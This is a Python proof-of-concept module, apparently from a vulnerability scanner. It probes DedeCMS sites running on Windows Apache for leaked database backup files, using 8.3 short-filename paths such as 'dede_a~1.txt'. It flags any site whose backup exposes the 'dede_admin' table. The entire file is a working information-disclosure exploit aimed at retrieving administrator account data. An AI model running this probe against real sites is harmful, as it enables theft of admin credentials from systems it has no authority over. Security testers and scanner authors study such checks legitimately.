#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'dedecms win apache shortfile'
        self.keyword = ['dedecms', 'win', 'apache', 'shortfile']
        self.info = 'Search admin\' infomation for dedecms with apache, windows and shorf file.'
        self.type = VUL_LEVEL.MEDIUM
        self.level = VUL_LEVEL.INFO
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    dir = 'data/backupdata/dede_a~'
                    for i in range(1, 6):
                        url = path + dir + str(i) + '.txt'
                        async with session.get(url=url) as res:
                            if res and res.status == 200:
                                text = await res.text()
                                if 'dede_admin' in text:
                                    self.flag = 1
                                    self.req.append({"url": url})
                                    self.res.append({"info": url, "key": 'dede_admin'})
